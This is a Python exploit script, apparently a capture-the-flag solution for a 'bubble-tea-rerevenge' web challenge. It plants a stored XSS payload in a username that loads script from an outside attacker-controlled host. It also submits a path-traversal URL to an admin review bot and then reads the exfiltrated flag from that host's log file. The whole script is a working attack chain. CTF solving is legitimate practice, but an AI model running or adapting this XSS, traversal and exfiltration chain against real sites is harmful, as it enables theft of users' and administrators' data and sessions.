
import sys
import requests
import re
import time
import random

WEBHOOK_LOGS = "https://manini.alwaysdata.net/logs.txt"
EXTERNAL = "https://manini.alwaysdata.net"

XSS_PAYLOAD = "[yt srcdoc=<script/src=\"EXTERNAL/kss.js\"></script>]".replace("EXTERNAL", EXTERNAL)
PATH_TRAVERSAL_PAYLOAD = "%2f.%09.%2f.%09.%2f.%09.%2f.%09.%2f.%09.%2fdrafts%2fsave"

session = requests.Session()
base_url = "https://bubble-tea-rerevenge.task.sasc.tf"
bot_url = "https://15943313-98c9-481a-93d4-8ad6c93e59ff.kit.sasc.tf"

username = XSS_PAYLOAD
password = "pass_pass123"

def login_account():
    resp = session.post(f"{base_url}/api/auth/login/", json={"username": username, "password": password})
    print("Account logged in successfully.")
    return resp.json().get("access_token")

def create_account():
    resp = session.post(f"{base_url}/api/auth/register/", json={"username": username, "password": password})
    access_token = resp.json().get("access_token")
    if(not access_token):
        access_token = login_account()
    else:
        print("Account created successfully.")
    return access_token

def create_post(access_token):
    resp = session.post(f"{base_url}/api/posts/", json={"content": "dummy"}, headers={"Authorization": f"Bearer {access_token}"})
    print("Post created successfully.")
    post = resp.json().get("post")
    return {"user_id": post.get("user_id"), "post_id": post.get("id")}

def submit_to_bot(user_id, post_id):
    resp = session.post(f"{bot_url}/review", json={"url": f"{base_url}/post/{user_id}/posts/{post_id}{PATH_TRAVERSAL_PAYLOAD}"})
    print("Submitted to bot successfully.")

def get_flag():
    resp = session.get(f"{WEBHOOK_LOGS}")
    match = re.search(r'(kaspersky\{.*?\})', resp.text, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

def main():
    SLEEP = 10
    access_token = create_account()
    post_info = create_post(access_token)
    submit_to_bot(post_info["user_id"], post_info["post_id"])
    time.sleep(SLEEP) # waiting for bot to process
    flag = get_flag()
    if flag:
        print(flag)
    else:
        print("Flag not found.")

main()
